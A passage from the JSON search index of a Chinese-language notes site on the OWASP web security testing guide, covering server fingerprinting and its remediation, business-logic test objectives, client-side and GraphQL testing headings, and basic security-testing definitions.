\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;\n&lt;html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"&gt;\n &lt;head&gt;\n  &lt;title&gt;400 Bad Request&lt;/title&gt;\n &lt;/head&gt;\n &lt;body&gt;\n  &lt;h1&gt;400 Bad Request&lt;/h1&gt;\n &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u7531\u4e8e\u9ed8\u8ba4\u9519\u8bef\u9875\u9762\u5728\u4e0d\u540c\u7c7b\u578b\u7684 Web \u670d\u52a1\u5668\u4e4b\u95f4\u63d0\u4f9b\u4e86\u8bb8\u591a\u533a\u5206\u56e0\u7d20\uff0c\u56e0\u6b64\u5373\u4f7f\u5728\u670d\u52a1\u5668\u6807\u5934\u5b57\u6bb5\u88ab\u906e\u76d6\u7684\u60c5\u51b5\u4e0b\uff0c\u5b83\u4eec\u7684\u68c0\u67e5\u4e5f\u53ef\u4ee5\u6210\u4e3a\u6307\u7eb9\u8bc6\u522b\u7684\u6709\u6548\u65b9\u6cd5\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.9%E6%8C%87%E7%BA%B9%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8/#_6","title":"\u4f7f\u7528\u81ea\u52a8\u626b\u63cf\u5de5\u5177","text":"<p>\u5982\u524d\u6240\u8ff0\uff0cWeb \u670d\u52a1\u5668\u6307\u7eb9\u8bc6\u522b\u901a\u5e38\u4f5c\u4e3a\u81ea\u52a8\u626b\u63cf\u5de5\u5177\u7684\u4e00\u9879\u529f\u80fd\u5305\u542b\u5728\u5185\u3002\u8fd9\u4e9b\u5de5\u5177\u80fd\u591f\u53d1\u51fa\u7c7b\u4f3c\u4e8e\u4e0a\u9762\u6f14\u793a\u7684\u8bf7\u6c42\uff0c\u4ee5\u53ca\u53d1\u9001\u5176\u4ed6\u66f4\u7279\u5b9a\u4e8e\u670d\u52a1\u5668\u7684\u63a2\u6d4b\u3002\u81ea\u52a8\u5316\u5de5\u5177\u53ef\u4ee5\u6bd4\u624b\u52a8\u6d4b\u8bd5\u66f4\u5feb\u5730\u6bd4\u8f83\u6765\u81ea Web \u670d\u52a1\u5668\u7684\u54cd\u5e94\uff0c\u5e76\u5229\u7528\u5df2\u77e5\u54cd\u5e94\u7684\u5927\u578b\u6570\u636e\u5e93\u6765\u5c1d\u8bd5\u8bc6\u522b\u670d\u52a1\u5668\u3002\u7531\u4e8e\u8fd9\u4e9b\u539f\u56e0\uff0c\u81ea\u52a8\u5316\u5de5\u5177\u66f4\u6709\u53ef\u80fd\u4ea7\u751f\u51c6\u786e\u7684\u7ed3\u679c\u3002</p> <p>\u4ee5\u4e0b\u662f\u4e00\u4e9b\u5305\u542b Web \u670d\u52a1\u5668\u6307\u7eb9\u8bc6\u522b\u529f\u80fd\u7684\u5e38\u7528\u626b\u63cf\u5de5\u5177\u3002</p> <ul> <li>Netcraft\uff0c\u4e00\u79cd\u626b\u63cf\u7f51\u7ad9\u4fe1\u606f\uff08\u5305\u62ec\u7f51\u7edc\u670d\u52a1\u5668\uff09\u7684\u5728\u7ebf\u5de5\u5177\u3002</li> <li>Nikto\uff0c\u4e00\u79cd\u5f00\u6e90\u547d\u4ee4\u884c\u626b\u63cf\u5de5\u5177\u3002</li> <li>Nmap\uff0c\u4e00\u4e2a\u5f00\u6e90\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u4e5f\u6709\u4e00\u4e2a GUI\uff0cZenmap\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.9%E6%8C%87%E7%BA%B9%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8/#_7","title":"\u6574\u6cbb","text":"<p>\u867d\u7136\u66b4\u9732\u7684\u670d\u52a1\u5668\u4fe1\u606f\u672c\u8eab\u4e0d\u4e00\u5b9a\u662f\u6f0f\u6d1e\uff0c\u4f46\u5b83\u662f\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u5229\u7528\u53ef\u80fd\u5b58\u5728\u7684\u5176\u4ed6\u6f0f\u6d1e\u7684\u4fe1\u606f\u3002\u66b4\u9732\u7684\u670d\u52a1\u5668\u4fe1\u606f\u8fd8\u53ef\u80fd\u5bfc\u81f4\u653b\u51fb\u8005\u627e\u5230\u7279\u5b9a\u4e8e\u7248\u672c\u7684\u670d\u52a1\u5668\u6f0f\u6d1e\uff0c\u8fd9\u4e9b\u6f0f\u6d1e\u53ef\u7528\u4e8e\u5229\u7528\u672a\u6253\u8865\u4e01\u7684\u670d\u52a1\u5668\u3002\u56e0\u6b64\uff0c\u5efa\u8bae\u91c7\u53d6\u4e00\u4e9b\u9884\u9632\u63aa\u65bd\u3002\u8fd9\u4e9b\u884c\u52a8\u5305\u62ec\uff1a</p> <ul> <li>\u9690\u85cf\u6807\u5934\u4e2d\u7684 Web \u670d\u52a1\u5668\u4fe1\u606f\uff0c\u4f8b\u5982\u4f7f\u7528 Apache \u7684mod_headers \u6a21\u5757\u3002</li> <li>\u4f7f\u7528\u52a0\u56fa\u7684\u53cd\u5411\u4ee3\u7406\u670d\u52a1\u5668\u5728 Web \u670d\u52a1\u5668\u548c Internet \u4e4b\u95f4\u521b\u5efa\u989d\u5916\u7684\u5b89\u5168\u5c42\u3002</li> <li>\u786e\u4fdd Web \u670d\u52a1\u5668\u4e0e\u6700\u65b0\u7684\u8f6f\u4ef6\u548c\u5b89\u5168\u8865\u4e01\u4fdd\u6301\u540c\u6b65\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/10%E3%80%81%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%B5%8B%E8%AF%95/","title":"10\u3001\u4e1a\u52a1\u903b\u8f91\u6d4b\u8bd5","text":"<p>\u4e1a\u52a1\u903b\u8f91\u4ecb\u7ecd</p> <p>\u6d4b\u8bd5\u591a\u529f\u80fd\u52a8\u6001 Web \u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u4e1a\u52a1\u903b\u8f91\u7f3a\u9677\u9700\u8981\u91c7\u7528\u975e\u5e38\u89c4\u65b9\u6cd5\u8fdb\u884c\u601d\u8003\u3002\u5982\u679c\u5f00\u53d1\u5e94\u7528\u7a0b\u5e8f\u7684\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236\u7684\u76ee\u7684\u662f\u6309\u7279\u5b9a\u987a\u5e8f\u6267\u884c\u6b65\u9aa4 1\u30012\u30013 \u6765\u5bf9\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u5982\u679c\u7528\u6237\u4ece\u6b65\u9aa4 1 \u76f4\u63a5\u8fdb\u5165\u6b65\u9aa4 3 \u4f1a\u53d1\u751f\u4ec0\u4e48\uff1f\u5728\u8fd9\u4e2a\u7b80\u5355\u7684\u793a\u4f8b\u4e2d\uff0c\u5e94\u7528\u7a0b\u5e8f\u662f\u5426\u901a\u8fc7\u6253\u5f00\u5931\u8d25\u6765\u63d0\u4f9b\u8bbf\u95ee\uff1f\u62d2\u7edd\u8bbf\u95ee\uff0c\u6216\u8005\u53ea\u662f\u51fa\u9519\u5e76\u663e\u793a 500 \u6d88\u606f\uff1f</p> <p>\u53ef\u4ee5\u4e3e\u51fa\u5f88\u591a\u4f8b\u5b50\uff0c\u4f46\u4e00\u4e2a\u4e0d\u53d8\u7684\u6559\u8bad\u662f\u201c\u8df3\u51fa\u4f20\u7edf\u667a\u6167\u601d\u8003\u201d\u3002\u8fd9\u79cd\u7c7b\u578b\u7684\u6f0f\u6d1e\u65e0\u6cd5\u88ab\u6f0f\u6d1e\u626b\u63cf\u5668\u68c0\u6d4b\u5230\uff0c\u5e76\u4e14\u4f9d\u8d56\u4e8e\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u7684\u6280\u80fd\u548c\u521b\u9020\u529b\u3002\u6b64\u5916\uff0c\u8fd9\u79cd\u7c7b\u578b\u7684\u6f0f\u6d1e\u901a\u5e38\u662f\u6700\u96be\u68c0\u6d4b\u7684\u6f0f\u6d1e\u4e4b\u4e00\uff0c\u5e76\u4e14\u901a\u5e38\u662f\u7279\u5b9a\u4e8e\u5e94\u7528\u7a0b\u5e8f\u7684\uff0c\u4f46\u540c\u65f6\uff0c\u5982\u679c\u88ab\u5229\u7528\uff0c\u901a\u5e38\u4e5f\u662f\u5bf9\u5e94\u7528\u7a0b\u5e8f\u6700\u6709\u5bb3\u7684\u6f0f\u6d1e\u4e4b\u4e00\u3002</p> <p>\u4e1a\u52a1\u903b\u8f91\u7f3a\u9677\u7684\u5206\u7c7b\u5c1a\u672a\u5f97\u5230\u5145\u5206\u7814\u7a76\uff1b\u5c3d\u7ba1\u5229\u7528\u4e1a\u52a1\u7f3a\u9677\u7ecf\u5e38\u53d1\u751f\u5728\u73b0\u5b9e\u4e16\u754c\u7684\u7cfb\u7edf\u4e2d\uff0c\u5e76\u4e14\u8bb8\u591a\u5e94\u7528\u6f0f\u6d1e\u7814\u7a76\u4eba\u5458\u5bf9\u6b64\u8fdb\u884c\u4e86\u8c03\u67e5\u3002\u6700\u53d7\u5173\u6ce8\u7684\u662f Web \u5e94\u7528\u7a0b\u5e8f\u3002\u793e\u533a\u5185\u90e8\u5b58\u5728\u4e89\u8bba\uff0c\u8fd9\u4e9b\u95ee\u9898\u662f\u5426\u4ee3\u8868\u4e86\u7279\u522b\u65b0\u7684\u6982\u5ff5\uff0c\u6216\u8005\u5b83\u4eec\u662f\u5426\u662f\u4f17\u6240\u5468\u77e5\u7684\u539f\u5219\u7684\u53d8\u4f53\u3002</p> <p>\u4e1a\u52a1\u903b\u8f91\u7f3a\u9677\u7684\u6d4b\u8bd5\u7c7b\u4f3c\u4e8e\u529f\u80fd\u6d4b\u8bd5\u4eba\u5458\u4f7f\u7528\u7684\u6d4b\u8bd5\u7c7b\u578b\uff0c\u91cd\u70b9\u5173\u6ce8\u903b\u8f91\u6216\u6709\u9650\u72b6\u6001\u6d4b\u8bd5\u3002\u8fd9\u4e9b\u7c7b\u578b\u7684\u6d4b\u8bd5\u8981\u6c42\u5b89\u5168\u4e13\u4e1a\u4eba\u5458\u4ee5\u4e0d\u540c\u7684\u65b9\u5f0f\u601d\u8003\uff0c\u5f00\u53d1\u6ee5\u7528\u548c\u8bef\u7528\u6848\u4f8b\uff0c\u5e76\u4f7f\u7528\u529f\u80fd\u6d4b\u8bd5\u4eba\u5458\u6240\u91c7\u7528\u7684\u8bb8\u591a\u6d4b\u8bd5\u6280\u672f\u3002\u4e1a\u52a1\u903b\u8f91\u6ee5\u7528\u6848\u4f8b\u7684\u81ea\u52a8\u5316\u662f\u4e0d\u53ef\u80fd\u7684\uff0c\u5e76\u4e14\u4ecd\u7136\u662f\u4f9d\u8d56\u4e8e\u6d4b\u8bd5\u4eba\u5458\u7684\u6280\u80fd\u53ca\u5176\u5bf9\u5b8c\u6574\u4e1a\u52a1\u6d41\u7a0b\u53ca\u5176\u89c4\u5219\u7684\u4e86\u89e3\u7684\u624b\u52a8\u827a\u672f\u3002</p> <p>4.10.1\u6d4b\u8bd5\u4e1a\u52a1\u903b\u8f91\u6570\u636e\u9a8c\u8bc1</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b\u6570\u636e\u6ce8\u5165\u70b9\u3002 \u9a8c\u8bc1\u6240\u6709\u68c0\u67e5\u90fd\u5728\u540e\u7aef\u8fdb\u884c\u4e14\u65e0\u6cd5\u7ed5\u8fc7\u3002 \u5c1d\u8bd5\u6253\u7834\u9884\u671f\u6570\u636e\u7684\u683c\u5f0f\u5e76\u5206\u6790\u5e94\u7528\u7a0b\u5e8f\u5982\u4f55\u5904\u7406\u5b83\u3002</p> <p>4.10.2\u6d4b\u8bd5\u4f2a\u9020\u8bf7\u6c42\u80fd\u529b</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u67e5\u770b\u9879\u76ee\u6587\u6863\uff0c\u5bfb\u627e\u53ef\u731c\u6d4b\u3001\u53ef\u9884\u6d4b\u6216\u9690\u85cf\u7684\u5b57\u6bb5\u529f\u80fd\u3002 \u63d2\u5165\u903b\u8f91\u4e0a\u6709\u6548\u7684\u6570\u636e\u4ee5\u7ed5\u8fc7\u6b63\u5e38\u7684\u4e1a\u52a1\u903b\u8f91\u5de5\u4f5c\u6d41\u7a0b\u3002</p> <p>4.10.3\u6d4b\u8bd5\u5b8c\u6574\u6027\u68c0\u67e5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u67e5\u770b\u7528\u4e8e\u79fb\u52a8\u3001\u5b58\u50a8\u6216\u5904\u7406\u6570\u636e\u7684\u7cfb\u7edf\u7ec4\u4ef6\u7684\u9879\u76ee\u6587\u6863\u3002 \u786e\u5b9a\u7ec4\u4ef6\u5728\u903b\u8f91\u4e0a\u53ef\u4ee5\u63a5\u53d7\u4ec0\u4e48\u7c7b\u578b\u7684\u6570\u636e\u4ee5\u53ca\u7cfb\u7edf\u5e94\u8be5\u9632\u8303\u4ec0\u4e48\u7c7b\u578b\u7684\u6570\u636e\u3002 \u786e\u5b9a\u8c01\u5e94\u8be5\u88ab\u5141\u8bb8\u4fee\u6539\u6216\u8bfb\u53d6\u6bcf\u4e2a\u7ec4\u4ef6\u4e2d\u7684\u6570\u636e\u3002 \u5c1d\u8bd5\u63d2\u5165\u3001\u66f4\u65b0\u6216\u5220\u9664\u6bcf\u4e2a\u7ec4\u4ef6\u4f7f\u7528\u7684\u6570\u636e\u503c\uff0c\u800c\u8fd9\u4e9b\u6570\u636e\u503c\u5728\u4e1a\u52a1\u903b\u8f91\u5de5\u4f5c\u6d41\u7a0b\u4e2d\u662f\u4e0d\u5141\u8bb8\u7684\u3002</p> <p>4.10.4\u8fdb\u7a0b\u65f6\u5e8f\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u67e5\u770b\u9879\u76ee\u6587\u6863\u4ee5\u4e86\u89e3\u53ef\u80fd\u53d7\u65f6\u95f4\u5f71\u54cd\u7684\u7cfb\u7edf\u529f\u80fd\u3002 \u5f00\u53d1\u5e76\u6267\u884c\u8bef\u7528\u6848\u4f8b\u3002</p> <p>4.10.5\u6d4b\u8bd5\u51fd\u6570\u53ef\u4f7f\u7528\u6b21\u6570\u9650\u5236</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u786e\u5b9a\u5fc5\u987b\u5bf9\u5176\u8c03\u7528\u6b21\u6570\u8bbe\u7f6e\u9650\u5236\u7684\u51fd\u6570\u3002 \u8bc4\u4f30\u529f\u80fd\u662f\u5426\u8bbe\u7f6e\u4e86\u903b\u8f91\u9650\u5236\u4ee5\u53ca\u662f\u5426\u7ecf\u8fc7\u6b63\u786e\u9a8c\u8bc1\u3002</p> <p>4.10.6\u5de5\u4f5c\u6d41\u7a0b\u89c4\u907f\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u67e5\u770b\u9879\u76ee\u6587\u6863\uff0c\u4e86\u89e3\u4ee5\u4e0e\u9884\u671f\u4e1a\u52a1\u903b\u8f91\u6d41\u4e0d\u540c\u7684\u987a\u5e8f\u8df3\u8fc7\u6216\u6267\u884c\u5e94\u7528\u7a0b\u5e8f\u6d41\u7a0b\u4e2d\u7684\u6b65\u9aa4\u7684\u65b9\u6cd5\u3002 \u5f00\u53d1\u4e00\u4e2a\u8bef\u7528\u6848\u4f8b\u5e76\u5c1d\u8bd5\u89c4\u907f\u5df2\u8bc6\u522b\u7684\u6bcf\u4e2a\u903b\u8f91\u6d41\u7a0b\u3002</p> <p>4.10.7\u6d4b\u8bd5\u9488\u5bf9\u5e94\u7528\u7a0b\u5e8f\u6ee5\u7528\u7684\u9632\u5fa1\u63aa\u65bd</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u4ece\u9488\u5bf9\u7cfb\u7edf\u8fdb\u884c\u7684\u6240\u6709\u6d4b\u8bd5\u4e2d\u751f\u6210\u6ce8\u91ca\u3002 \u6839\u636e\u79ef\u6781\u7684\u8f93\u5165\uff0c\u68c0\u67e5\u54ea\u4e9b\u6d4b\u8bd5\u5177\u6709\u4e0d\u540c\u7684\u529f\u80fd\u3002 \u4e86\u89e3\u73b0\u6709\u7684\u9632\u5fa1\u63aa\u65bd\u5e76\u9a8c\u8bc1\u5b83\u4eec\u662f\u5426\u8db3\u4ee5\u4fdd\u62a4\u7cfb\u7edf\u514d\u53d7\u7ed5\u8fc7\u6280\u672f\u7684\u653b\u51fb\u3002</p> <p>4.10.8\u5f02\u5e38\u6587\u4ef6\u7c7b\u578b\u6d4b\u8bd5\u4e0a\u4f20</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u67e5\u770b\u9879\u76ee\u6587\u6863\u4ee5\u4e86\u89e3\u7cfb\u7edf\u62d2\u7edd\u7684\u6587\u4ef6\u7c7b\u578b\u3002 \u9a8c\u8bc1\u662f\u5426\u62d2\u7edd\u5e76\u5b89\u5168\u5904\u7406\u4e0d\u53d7\u6b22\u8fce\u7684\u6587\u4ef6\u7c7b\u578b\u3002 \u9a8c\u8bc1\u6587\u4ef6\u6279\u91cf\u4e0a\u4f20\u662f\u5426\u5b89\u5168\uff0c\u5e76\u4e14\u4e0d\u5141\u8bb8\u4efb\u4f55\u7ed5\u8fc7\u8bbe\u7f6e\u7684\u5b89\u5168\u63aa\u65bd\u3002</p> <p>4.10.9\u6076\u610f\u6587\u4ef6\u4e0a\u4f20\u6d4b\u8bd5</p> <p>\u8bc6\u522b\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\u3002 \u67e5\u770b\u9879\u76ee\u6587\u6863\u4ee5\u786e\u5b9a\u54ea\u4e9b\u6587\u4ef6\u7c7b\u578b\u88ab\u89c6\u4e3a\u53ef\u63a5\u53d7\uff0c\u4ee5\u53ca\u54ea\u4e9b\u7c7b\u578b\u88ab\u89c6\u4e3a\u5371\u9669\u6216\u6076\u610f\u3002 \u5982\u679c\u6ca1\u6709\u53ef\u7528\u7684\u6587\u6863\uff0c\u5219\u6839\u636e\u5e94\u7528\u7a0b\u5e8f\u7684\u76ee\u7684\u8003\u8651\u4ec0\u4e48\u662f\u5408\u9002\u7684\u3002 \u786e\u5b9a\u5982\u4f55\u5904\u7406\u4e0a\u4f20\u7684\u6587\u4ef6\u3002 \u83b7\u53d6\u6216\u521b\u5efa\u4e00\u7ec4\u6076\u610f\u6587\u4ef6\u4ee5\u8fdb\u884c\u6d4b\u8bd5\u3002 \u5c1d\u8bd5\u5c06\u6076\u610f\u6587\u4ef6\u4e0a\u4f20\u5230\u5e94\u7528\u7a0b\u5e8f\u5e76\u786e\u5b9a\u662f\u5426\u88ab\u63a5\u53d7\u548c\u5904\u7406\u3002</p> <p>4.10.10\u6d4b\u8bd5\u652f\u4ed8\u529f\u80fd</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u786e\u5b9a\u7535\u5b50\u5546\u52a1\u529f\u80fd\u7684\u4e1a\u52a1\u903b\u8f91\u662f\u5426\u7a33\u5065\u3002 \u4e86\u89e3\u652f\u4ed8\u529f\u80fd\u7684\u5de5\u4f5c\u539f\u7406\u3002 \u786e\u5b9a\u652f\u4ed8\u529f\u80fd\u662f\u5426\u5b89\u5168\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/11%E3%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B5%8B%E8%AF%95/","title":"11\u3001\u5ba2\u6237\u7aef\u6d4b\u8bd5","text":"<p>\u6d4b\u8bd5\u57fa\u4e8e DOM \u7684\u8de8\u7ad9\u811a\u672c</p> <ul> <li>4.11.1.1\u6d4b\u8bd5\u57fa\u4e8e\u81ea DOM \u7684\u8de8\u7ad9\u811a\u672c</li> </ul> <p>4.11.2\u00a0JavaScript \u6267\u884c\u6d4b\u8bd5</p> <p>4.11.3\u00a0HTML \u6ce8\u5165\u6d4b\u8bd5</p> <p>4.11.4\u6d4b\u8bd5\u5ba2\u6237\u7aef URL \u91cd\u5b9a\u5411</p> <p>4.11.5\u00a0CSS\u6ce8\u5165\u6d4b\u8bd5</p> <p>4.11.6\u5ba2\u6237\u7aef\u8d44\u6e90\u64cd\u4f5c\u6d4b\u8bd5</p> <p>4.11.7\u6d4b\u8bd5\u8de8\u6e90\u8d44\u6e90\u5171\u4eab</p> <p>4.11.8\u8de8\u7ad9\u5237\u673a\u6d4b\u8bd5</p> <p>4.11.9\u70b9\u51fb\u52ab\u6301\u6d4b\u8bd5</p> <p>4.11.10\u6d4b\u8bd5 WebSocket</p> <p>4.11.11\u6d4b\u8bd5\u7f51\u7edc\u6d88\u606f</p> <p>4.11.12\u6d4b\u8bd5\u6d4f\u89c8\u5668\u5b58\u50a8</p> <p>4.11.13\u6d4b\u8bd5\u8de8\u7ad9\u811a\u672c\u5305\u542b</p> <p>4.11.14\u53cd\u5411 Tabnabbing \u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/12%E3%80%81API%E6%B5%8B%E8%AF%95/","title":"12\u3001API\u6d4b\u8bd5","text":"<p>\u6d4b\u8bd5 GraphQL</p> <p>\u6982\u62ec GraphQL \u5728\u73b0\u4ee3 API \u4e2d\u53d8\u5f97\u975e\u5e38\u6d41\u884c\u3002\u5b83\u63d0\u4f9b\u4e86\u7b80\u5355\u6027\u548c\u5d4c\u5957\u5bf9\u8c61\uff0c\u6709\u5229\u4e8e\u66f4\u5feb\u7684\u5f00\u53d1\u3002\u867d\u7136\u6bcf\u79cd\u6280\u672f\u90fd\u6709\u4f18\u70b9\uff0c\u4f46\u5b83\u4e5f\u53ef\u80fd\u4f7f\u5e94\u7528\u7a0b\u5e8f\u9762\u4e34\u65b0\u7684\u653b\u51fb\u9762\u3002\u6b64\u573a\u666f\u7684\u76ee\u7684\u662f\u4e3a\u4f7f\u7528 GraphQL \u7684\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u4e00\u4e9b\u5e38\u89c1\u7684\u9519\u8bef\u914d\u7f6e\u548c\u653b\u51fb\u5411\u91cf\u3002\u6709\u4e9b\u5411\u91cf\u662f GraphQL \u7279\u6709\u7684\uff08\u4f8b\u5982Introspection Query\uff09\uff0c\u6709\u4e9b\u5411\u91cf\u662f API \u901a\u7528\u7684\uff08\u4f8b\u5982SQL \u6ce8\u5165\uff09\u3002</p> <p>\u672c\u8282\u4e2d\u7684\u793a\u4f8b\u5c06\u57fa\u4e8e\u6613\u53d7\u653b\u51fb\u7684 GraphQL \u5e94\u7528\u7a0b\u5e8fpoc-graphql\uff0c\u8be5\u5e94\u7528\u7a0b\u5e8f\u5728\u6620\u5c04\u4e3a\u6613\u53d7\u653b\u51fb\u7684 GraphQL \u8282\u70b9\u7684 docker \u5bb9\u5668\u4e2d\u8fd0\u884clocalhost:8080/ GraphQL\u3002</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc4\u4f30\u662f\u5426\u90e8\u7f72\u4e86\u5b89\u5168\u4e14\u53ef\u7528\u4e8e\u751f\u4ea7\u7684\u914d\u7f6e\u3002 \u9a8c\u8bc1\u6240\u6709\u8f93\u5165\u5b57\u6bb5\u662f\u5426\u53d7\u5230\u4e00\u822c\u653b\u51fb\u3002 \u786e\u4fdd\u5e94\u7528\u9002\u5f53\u7684\u8bbf\u95ee\u63a7\u5236\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1%E3%80%81Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/","title":"\u7b80\u4ecb\u548c\u76ee\u6807","text":"<p>\u672c\u8282\u63cf\u8ff0\u4e86 <code>OWASP Web</code> \u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6d4b\u8bd5\u65b9\u6cd5\uff0c\u5e76\u89e3\u91ca\u4e86\u5982\u4f55\u6d4b\u8bd5\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7531\u4e8e\u5df2\u8bc6\u522b\u7684\u5b89\u5168\u63a7\u5236\u7f3a\u9677\u800c\u5b58\u5728\u6f0f\u6d1e\u7684\u8bc1\u636e\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1%E3%80%81Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/#web","title":"\u4ec0\u4e48\u662f WEB \u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6d4b\u8bd5\uff1f","text":"<p>\u5b89\u5168\u6d4b\u8bd5\u662f\u4e00\u79cd\u901a\u8fc7\u7cfb\u7edf\u5730\u9a8c\u8bc1\u548c\u9a8c\u8bc1\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u63a7\u5236\u7684\u6709\u6548\u6027\u6765\u8bc4\u4f30\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7f51\u7edc\u5b89\u5168\u6027\u7684\u65b9\u6cd5\u3002Web \u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6d4b\u8bd5\u4ec5\u4fa7\u91cd\u4e8e\u8bc4\u4f30 Web \u5e94\u7528\u7a0b\u5e8f\u7684\u5b89\u5168\u6027\u3002\u8be5\u8fc7\u7a0b\u6d89\u53ca\u5bf9\u5e94\u7528\u7a0b\u5e8f\u7684\u4efb\u4f55\u5f31\u70b9\u3001\u6280\u672f\u7f3a\u9677\u6216\u6f0f\u6d1e\u8fdb\u884c\u4e3b\u52a8\u5206\u6790\u3002\u53d1\u73b0\u7684\u4efb\u4f55\u5b89\u5168\u95ee\u9898\u5c06\u8fde\u540c\u5f71\u54cd\u8bc4\u4f30\u3001\u7f13\u89e3\u5efa\u8bae\u6216\u6280\u672f\u89e3\u51b3\u65b9\u6848\u4e00\u8d77\u63d0\u4ea4\u7ed9\u7cfb\u7edf\u6240\u6709\u8005\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1%E3%80%81Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/#_2","title":"\u4ec0\u4e48\u662f\u6f0f\u6d1e\uff1f","text":"<p><code>\u6f0f\u6d1e</code>\u662f\u7cfb\u7edf\u8bbe\u8ba1\u3001\u5b9e\u65bd\u3001\u64cd\u4f5c\u6216\u7ba1\u7406\u4e2d\u7684\u7f3a\u9677\u6216\u5f31\u70b9\uff0c\u53ef\u88ab\u7528\u6765\u7834\u574f\u7cfb\u7edf\u7684\u5b89\u5168\u76ee\u6807\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1%E3%80%81Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/#_3","title":"\u4ec0\u4e48\u662f\u5a01\u80c1\uff1f","text":"<p><code>\u5a01\u80c1</code>\u662f\u4efb\u4f55\u53ef\u80fd\u635f\u5bb3\u5e94\u7528\u7a0b\u5e8f\u62e5\u6709\u7684\u8d44\u4ea7\uff08\u6709\u4ef7\u503c\u7684\u8d44\u6e90\uff0c\u4f8b\u5982\u6570\u636e\u5e93\u6216\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u6570\u636e\uff09\u7684\u4efb\u4f55\u4e8b\u7269\uff08\u6076\u610f\u7684\u5916\u90e8\u653b\u51fb\u8005\u3001\u5185\u90e8\u7528\u6237\u3001\u7cfb\u7edf\u4e0d\u7a33\u5b9a\u7b49\uff09\u6f0f\u6d1e\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1%E3%80%81Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/#_4","title":"\u4ec0\u4e48\u662f\u6d4b\u8bd5\uff1f","text":"<p><code>\u6d4b\u8bd5</code>\u662f\u8bc1\u660e\u5e94\u7528\u7a0b\u5e8f\u6ee1\u8db3\u5176\u5229\u76ca\u76f8\u5173\u8005\u7684\u5b89\u5168\u8981\u6c42\u7684\u64cd\u4f5c\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1%E3%80%81Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/#_5","title":"\u7f16\u5199\u672c\u6307\u5357\u7684\u65b9\u6cd5","text":"<p>OWASP \u65b9\u6cd5\u662f\u5f00\u653e\u548c\u534f\u4f5c\u7684\uff1a</p> <ul> <li>\u5f00\u653e\uff1a\u6bcf\u4e00\u4f4d\u5b89\u5168\u4e13\u5bb6\u90fd\u53ef\u4ee5\u5e26\u7740\u4ed6\u4eec\u5728\u9879\u76ee\u4e2d\u7684\u7ecf\u9a8c\u53c2\u4e0e\u3002\u4e00\u5207\u90fd\u662f\u514d\u8d39\u7684\u3002</li> <li>\u534f\u4f5c\uff1a\u5728\u64b0\u5199\u6587\u7ae0\u4e4b\u524d\u8fdb\u884c\u5934\u8111\u98ce\u66b4\uff0c\u4ee5\u4fbf\u56e2\u961f\u53ef\u4ee5\u5206\u4eab\u60f3\u6cd5\u5e76\u5236\u5b9a\u9879\u76ee\u7684\u96c6\u4f53\u613f\u666f\u3002\u8fd9\u610f\u5473\u7740\u7c97\u7565\u7684\u5171\u8bc6\u3001\u66f4\u5e7f\u6cdb\u7684\u53d7\u4f17\u548c\u66f4\u591a\u7684\u53c2\u4e0e\u3002</li> </ul> <p>\u8fd9\u79cd\u65b9\u6cd5\u503e\u5411\u4e8e\u521b\u5efa\u4e00\u4e2a\u5b9a\u4e49\u597d\u7684\u6d4b\u8bd5\u65b9\u6cd5\u8bba\uff0c\u5b83\u5c06\u662f\uff1a</p> <ul> 